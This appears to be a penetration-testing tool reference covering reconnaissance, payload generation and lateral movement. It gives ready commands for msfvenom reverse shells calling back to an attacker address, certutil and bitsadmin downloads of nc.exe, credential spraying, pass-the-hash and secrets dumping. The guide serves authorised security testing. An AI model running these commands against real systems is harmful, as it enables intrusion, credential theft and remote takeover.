Stage 1

Reconnaissance

Map the target: hosts, open ports, services, versions, and the people and names around them. Passive OSINT first, then active scanning and enumeration.

ffuf Web fuzzing A fast web fuzzer that puts the FUZZ keyword anywhere in a request: paths, parameters, headers, POST bodies and Host for vhosts. The flexible companion to Gobuster when you need recursion, filtering or to fuzz something other than a path.
Reconnaissancehttphttps8044380808443fuzzingenumerationdirectoriesparameters

When to reach for it

Content discovery where you need more than a directory list: fuzzing a GET/POST parameter, a subdomain, a virtual host, or recursing into found directories. Put FUZZ where the wordlist should go.

Key flags

  • -u: URL, with FUZZ as the injection point.
  • -w list.txt: wordlist (add :KEYWORD to name it for multi-fuzz).
  • -H "Header: value": add a header (use FUZZ here for vhosts).
  • -X POST -d "x=FUZZ": method and body data.
  • -recursion -recursion-depth 2: recurse into discovered directories.
  • -mc 200,301: match these status codes; -fc 404 filters them out.
  • -fs 1234 / -fw / -fl: filter by response size, word or line count (hide a uniform "not found" page).
  • -ac: auto-calibrate filters from the baseline response.

Commands

Directory discovery, filtering the 404 size automatically:

bashffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac

Virtual host discovery (filter out the default response size):

bashffuf -u http://TARGET -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234

Fuzz a GET parameter value, then a parameter name:

bashffuf -u "http://TARGET/item?id=FUZZ" -w ids.txt -mc 200 -fc 404
ffuf -u "http://TARGET/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234

Workflow

  1. Get a baseline: browse the app, note the size of a known-missing page.
  2. Fuzz directories with -ac so the baseline is filtered for you.
  3. Recurse into anything interesting (-recursion).
  4. Move from paths to parameters once you find a dynamic endpoint.
  5. Feed found parameters into the exploitation stage (injection, IDOR, LFI).

Notes

If every line comes back 200 with the same size, the app has a catch-all: filter on size/words (-fs/-fw) or use -ac. Threads default high; drop with -t against fragile targets. Wordlist choice matters more than the tool: match it to the stack.

Gobuster Web content discovery Brute-forces hidden web content: directories and files, DNS subdomains, and virtual hosts. Run it against any HTTP or HTTPS service once a port scan finds one.
Reconnaissancehttphttps8044380808443enumerationfuzzingdirectoriessubdomains

When to reach for it

A web server is open (port 80, 443 or similar) and you need to find what is not linked from the homepage: admin panels, backup files, API paths, other virtual hosts. Point it at the service with a wordlist.

Key flags

  • dir / dns / vhost: the mode: directory brute force, DNS subdomains, or virtual hosts.
  • -u: target URL (dir/vhost mode).
  • -d: target domain (dns mode).
  • -w: wordlist path.
  • -x php,html,txt: file extensions to append to each word.
  • -t 50: number of concurrent threads.
  • -k: skip TLS certificate verification (self-signed labs).
  • -b 404,403: blacklist these status codes (hide noise).
  • -o out.txt: write results to a file.

Commands

Directory and file discovery:

bashgobuster dir -u http://TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50 -o gobuster-dir.txt

DNS subdomain discovery (needs a resolvable domain):

bashgobuster dns -d TARGET.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50

Virtual host discovery (same IP, different Host: header):

bashgobuster vhost -u http://TARGET.com --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Workflow

  1. From the port scan, note every HTTP/HTTPS port and the server banner.
  2. Browse the site first; note the tech stack to choose extensions (-x).
  3. Run dir mode with a medium wordlist.
  4. If the host serves by name, run vhost to find other sites on the same IP.
  5. Feed interesting paths (login, upload, admin) into the next tool.

Notes

Pick the wordlist to fit the stack: a PHP app wants -x php, an IIS box wants asp,aspx. ffuf and feroxbuster cover the same ground with recursion and more filtering; keep one as a backup when results look thin.

NetExec Network and AD enumeration The successor to CrackMapExec. Sweeps a subnet for SMB, WinRM, LDAP, MSSQL and more, checks credentials across hosts, lists shares and users, and flags where a credential is a local admin. The workhorse of internal and Active Directory enumeration.
Reconnaissancesmbwinrmldapmssqlrdpsshftp22214451351393896361433338959855986enumerationsmbactive-directorycredential-spray

When to reach for it

You are on an internal network with (or without) a credential and need the lay of the land: which hosts speak SMB, which shares are readable, which accounts are valid, and: the prize: where a credential has local admin. Run it across a range, not one host at a time.

Key flags

  • smb, winrm, ldap, mssql, ssh: the protocol module to use.
  • -u user / -u users.txt: username or list.
  • -p pass / -p passwords.txt: password or list.
  • -H hash: authenticate with an NTLM hash (pass-the-hash).
  • --local-auth: treat credentials as local, not domain.
  • --shares: list shares and the access the credential has.
  • --users, --groups, --pass-pol: enumerate domain users, groups, password policy.
  • --sam, --lsa: dump local secrets (needs admin).
  • -x "cmd" / -X "ps": run a command (needs admin).

Commands

Sweep a subnet for SMB and read the host banners (no credential needed):

bashnetexec smb 10.10.10.0/24

Validate a credential across every host; (Pwn3d!) marks local admin:

bashnetexec smb 10.10.10.0/24 -u jsmith -p 'Winter2026!'

List shares the credential can reach:

bashnetexec smb 10.10.10.0/24 -u jsmith -p 'Winter2026!' --shares

Pass-the-hash, local admin check:

bashnetexec smb TARGET -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

Enumerate the domain (users, groups, password policy):

bashnetexec smb DC01 -u jsmith -p 'Winter2026!' --users --groups --pass-pol

Workflow

  1. Unauthenticated sweep: find SMB hosts, signing status and the domain/host names.
  2. With a credential, spray it across the range to find where it is valid and where it is admin.
  3. On hosts you can read, list shares and loot them for config, scripts and credentials.
  4. Against a DC, enumerate users, groups and the password policy to plan a safe spray.
  5. Record every (Pwn3d!): those are your footholds for the next stage.

Notes

A credential spray with -u users.txt -p onepassword is quiet; -u user -p passwords.txt risks lockout: mind the password policy you pulled with --pass-pol. SMB signing "False" on the host list is what makes a relay attack possible later. Dumping SAM/LSA and running commands needs admin and is noisy; save it for when you have the access and the authorisation.

Nmap Network scanning The port scanner. Finds live hosts, open ports, service versions and, through NSE scripts, a first pass of service enumeration. Usually the first command run against an in-scope network.
Reconnaissancescanningenumerationhost-discoveryversion-detection

When to reach for it

First contact with an in-scope host or range. You want to know what is alive, what ports are open, and what is listening before you pick a direction. Run a fast sweep to find open ports, then a focused, deeper scan on just those ports.

Key flags

  • -sC: run the default NSE script set (safe, enumeration-focused).
  • -sV: probe open ports to determine service and version.
  • -p-: scan all 65,535 TCP ports (default is the top 1,000).
  • -p 22,80,445: scan a specific list of ports.
  • --min-rate 1000: send at least this many packets per second (speeds up large scans).
  • -sU: UDP scan (slow; use a small port list).
  • -Pn: skip host discovery, treat the host as up (use when ICMP is filtered).
  • -oA name: write results in all three formats (.nmap, .gnmap, .xml) with the given basename.
  • -A: aggressive, runs -sC -sV -O --traceroute in one flag.

Commands

A fast scan of all TCP ports, then a detailed scan of only the open ones:

bash# 1. Fast sweep: every TCP port, just find what's open
nmap -p- --min-rate 1000 -T4 TARGET -oA scans/all-ports

# 2. Pull the open ports out and scan them in depth
ports=$(grep -oP '\d+/open' scans/all-ports.gnmap | cut -d/ -f1 | paste -sd,)
nmap -p "$ports" -sC -sV TARGET -oA scans/deep

UDP top ports (slow, so keep the list short):

bashnmap -sU --top-ports 50 TARGET -oA scans/udp

Scan a whole range for a single service, output grep-able:

bashnmap -p 445 --open 10.10.10.0/24 -oG - | grep open

Workflow

  1. Confirm the target is in scope before scanning anything.
  2. Fast full-port TCP sweep to find open ports.
  3. Deep -sC -sV scan on only the open ports.
  4. Note service versions and feed each interesting service into its own tool (web to a content scanner, SMB to an SMB enumerator, and so on).
  5. Save all output (-oA) so the evidence is in the report.

Notes

-sC runs the default script category, which is safe and mostly read-only, but still touches the service. Scanning is noisy and will show up in the target's logs: expected on an authorised test, but keep the scope and timing in your notes. A closed or filtered result is evidence too: record it.

Stage 2

Weaponisation

Turn a finding into something that will run on the target: a payload, a crafted document, a wordlist tuned to the environment.

Payload generationWordlist and mask craftingEncoding and packing
msfvenom Payload generation The Metasploit payload generator. Produces reverse and bind shells in the format the target can run: exe, elf, war, aspx, raw shellcode: ready to pair with a listener. The standard way to make a payload for an authorised test.
Weaponisationpayloadsshellcodereverse-shellencoders

When to reach for it

Exploitation found a way to run a file or code, and you need the file: a Windows exe, a Linux elf, a web shell (war/aspx/jsp), or raw shellcode to drop into an exploit. Generate it, host it, and start the matching listener.

Key flags

  • -p: the payload (e.g. windows/x64/meterpreter/reverse_tcp).
  • LHOST= / LPORT=: your listener address and port (payload options go as KEY=value).
  • -f: output format: exe, elf, war, aspx, raw, psh, python.
  • -o file: write to a file (otherwise stdout).
  • -a / --platform: architecture and platform.
  • -e / -i: encoder and iterations (evasion; modern defences see through most).
  • -b "\x00\x0a": bad characters to avoid in shellcode.
  • --list payloads|formats|encoders: list what is available.

Commands

A staged Windows Meterpreter reverse shell as an exe:

bashmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe

A Linux elf reverse shell:

bashmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf

A web payload for a file-upload foothold (war for Tomcat, aspx for IIS):

bashmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx

Raw shellcode for a buffer overflow, avoiding bad characters:

bashmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -b "\x00\x0a\x0d" -f python -v buf

Workflow

  1. Pick the payload format the foothold can execute (exe, war, aspx, raw).
  2. Set LHOST/LPORT to your machine and an outbound-friendly port (443 often works).
  3. Generate the file and host it (a simple web server, or an SMB share).
  4. Start the matching listener before delivery (Metasploit multi/handler, or nc for a plain shell).
  5. Deliver and catch the callback.

Notes

A staged payload (.../meterpreter/reverse_tcp) needs the Metasploit handler; a stageless one (reverse_winhttps, shell_reverse_tcp) is self-contained and easier with nc. Built-in encoders (shikata_ga_nai) rarely beat modern EDR: treat them as encoding, not evasion. Keep payloads inside the engagement scope and clean them up afterwards.

Pick a channel

HTTP/HTTPS egresses almost everywhere and is encrypted in transit, so it is the default. SMB (445) and FTP (21) are usually blocked outbound, so keep them for the internal leg. When nothing is allowed out, fall back to copy and paste (base64) or an alternate channel.

Host a server on your attacking box

bash# HTTP, serve the current directory
python3 -m http.server 8000

# HTTP with an upload endpoint (POST to /upload)
python3 -m uploadserver 8000

# SMB share (add -user/-password; new Windows refuses guest access)
impacket-smbserver share "$(pwd)" -smb2support
impacket-smbserver share "$(pwd)" -smb2support -user pt -password pt

# FTP (anonymous unless you set a user; --write to allow uploads)
sudo python3 -m pyftpdlib --port 21 --write

Windows: download

Base64 copy and paste (no network)

bash# On the source, print one base64 line
cat id_rsa | base64 -w 0; echo
# On the target, paste and decode (Linux)

Notes

For the fastest, quietest path, host over HTTP and fetch with PowerShell iwr or a Linux curl; reach for SMB, FTP or base64 only when that is blocked.

The idea

A "LOLBIN" is a trusted binary abused beyond its purpose: download, upload, execute, read or write files. Search LOLBAS for /download or /upload, and GTFOBins for +file download / +file upload, to find one that already exists in the environment.

Windows download

cmd:: certutil (a defacto wget for Windows; AMSI flags this usage)
certutil.exe -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe
:: bitsadmin
bitsadmin /transfer job /priority foreground http://10.10.14.5:8000/nc.exe C:\Temp\nc.exe
powershell# BITS via PowerShell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.14.5:8000/nc.exe" -Destination "C:\Temp\nc.exe"
# A misplaced-trust binary that application whitelisting may allow
GfxDownloadWrapper.exe "http://10.10.14.5/tool.exe" "C:\Temp\tool.exe"

Linux (GTFOBins), openssl as an nc-style transfer

bash# On your box: serve a file over TLS

openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < tool
# On the target: receive it
openssl s_client -connect 10.10.14.5:443 -quiet > tool

Notes

certutil and certutil-style downloads are widely detected now (AMSI, user-agent Microsoft-CryptoAPI), so treat LOLBINs as whitelisting-bypass, not stealth. Check LOLBAS and GTFOBins for a binary that is already in the target's image before you drop your own. GTFOBins covers roughly 40 common binaries for transfer.

Encrypt before it moves

Loot (hashes, NTDS.dit, configs) should not cross the wire in the clear. Encrypt it, then send over HTTPS, SFTP or SSH. For a DLP or egress test, use dummy data that mimics the real thing rather than real client data.

bash# Linux: OpenSSL AES-256
openssl enc -aes256 -iter 100000 -pbkdf2 -in loot.tar -out loot.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in loot.enc -out loot.tar
powershell# Windows: Invoke-AESEncryption.ps1 (import, then encrypt a file or string)
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "strong-unique-pass" -Path .\scan-results.txt   # -> scan-results.txt.aes
Invoke-AESEncryption -Mode Decrypt -Key "strong-unique-pass" -Path .\scan-results.txt.aes

Use a strong, unique password per engagement, so one leaked password cannot decrypt loot from another client.

Blend the transfer in

Each download tool has a tell-tale user agent (Microsoft BITS/7.8, Microsoft-CryptoAPI, WindowsPowerShell/5.1...). Defenders hunt these, so set a common browser agent when it matters.

When to reach for it

You have a domain credential or hash and a goal: dump more credentials, move to another host, or get crackable Kerberos tickets. Impacket does each over the wire from your Linux box, no agent on the target.

Key flags

Credentials are given as DOMAIN/user:password@HOST, or with -hashes LM:NT for pass-the-hash.

  • secretsdump.py: dump SAM, LSA and, with the right rights, the whole domain via DCSync (-just-dc).
  • psexec.py / wmiexec.py / smbexec.py: remote command execution (psexec drops a service; wmiexec is quieter).
  • GetUserSPNs.py -request: Kerberoast: pull service tickets for offline cracking.
  • GetNPUsers.py: AS-REP roast accounts that don't require pre-auth.
  • -k -no-pass: use a Kerberos ticket from the environment (KRB5CCNAME).

bashwmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/administrator@10.10.10.5

  1. From a valid domain credential, enumerate SPNs and AS-REP-roastable accounts; crack what comes back offline.
  2. Where a credential is local admin (NetExec told you), dump secrets for more material.
  3. Reuse hashes with the exec scripts (pass-the-hash) to move laterally: prefer wmiexec over psexec for noise.
  4. With Domain Admin or DCSync rights, secretsdump -just-dc for the krbtgt and the domain.
  5. Record every credential, its source and the technique for the report.
